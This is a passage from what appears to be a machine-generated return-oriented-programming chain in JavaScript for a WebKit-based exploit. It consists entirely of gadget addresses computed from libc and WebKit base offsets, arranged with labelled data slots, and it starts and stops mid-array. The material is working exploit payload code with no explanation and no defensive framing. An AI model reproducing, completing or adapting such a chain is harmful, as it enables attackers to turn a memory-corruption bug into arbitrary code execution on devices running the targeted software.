libc_base+362222, //pop rsi
ropchain+101536, //L932-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+101520, //L931-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L931:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L932:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+101680, //L935-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+101648, //L933-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+101664, //L934-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+101752, //L936-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L936:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+101808, //L939-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L939:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+101888, //L940-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L940:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L941:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L942:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+101992, //L943-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+102008, //L944-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+102096, //L945-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L945:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+102152, //L948-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L948:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+102224, //L949-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L949:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+102280, //L952-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L952:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L953:
libc_base+362222, //pop rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+102432, //L956-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L954:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L956:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+102536, //L959-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+102520, //L958-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L958:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+102680, //L962-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+102648, //L960-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+102664, //L961-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+102752, //L963-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+102808, //L966-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L966:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+102888, //L967-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L967:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L968:
db([17, 0]); // 0x11
set_gadget(libc_base+757614,); //pop rcx
//L969:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+102992, //L970-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+103008, //L971-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+103096, //L972-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L972:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+103152, //L975-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L975:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+103224, //L976-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L976:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+103280, //L979-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L979:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+103384, //L982-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L980:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L982:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+103488, //L985-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+103472, //L984-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L984:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+103632, //L988-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+103600, //L986-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+103616, //L987-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L986:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+103704, //L989-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L989:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+103760, //L992-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L992:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+103840, //L993-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L993:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L994:
db([6, 0]); // 0x6
set_gadget(libc_base+757614,); //pop rcx
//L995:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+103944, //L996-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+103960, //L997-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L996:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L997:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+104048, //L998-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L998:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+104104, //L1001-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1001:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+104224, //L1004-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1002:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+104328, //L1007-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+104312, //L1006-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1006:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1007:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+104472, //L1010-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+104440, //L1008-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+104456, //L1009-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1008:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1009:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+104544, //L1011-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+104600, //L1014-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1014:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+104680, //L1015-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1015:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1016:
db([18, 0]); // 0x12
set_gadget(libc_base+757614,); //pop rcx
//L1017:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+104784, //L1018-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+104800, //L1019-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+104888, //L1020-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1020:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+104944, //L1023-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1023:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+105016, //L1024-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1024:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+105072, //L1027-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1027:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1028:
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+105224, //L1031-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1029:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1031:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+105328, //L1034-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+105312, //L1033-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1033:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1034:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+105472, //L1037-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+105440, //L1035-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+105456, //L1036-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+105544, //L1038-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1038:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+105600, //L1041-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1041:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+105680, //L1042-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1042:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1043:
db([19, 0]); // 0x13
set_gadget(libc_base+757614,); //pop rcx
//L1044:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+105784, //L1045-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+105800, //L1046-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+105888, //L1047-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1047:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+105944, //L1050-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1050:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+106016, //L1051-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1051:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+106072, //L1054-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1054:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1055:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+106224, //L1058-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1056:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1058:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+106328, //L1061-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+106312, //L1060-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1060:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1061:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+106472, //L1064-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+106440, //L1062-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+106456, //L1063-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+106544, //L1065-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+106600, //L1068-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1068:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+106680, //L1069-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1069:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1070:
db([20, 0]); // 0x14
set_gadget(libc_base+757614,); //pop rcx
//L1071:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+106784, //L1072-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+106800, //L1073-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+106888, //L1074-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1074:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+106944, //L1077-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1077:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+107016, //L1078-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+107072, //L1081-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1081:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1082:
libc_base+362222, //pop rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+107224, //L1085-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1083:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+107328, //L1088-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+107312, //L1087-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1087:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1088:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+107472, //L1091-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+107440, //L1089-0x10
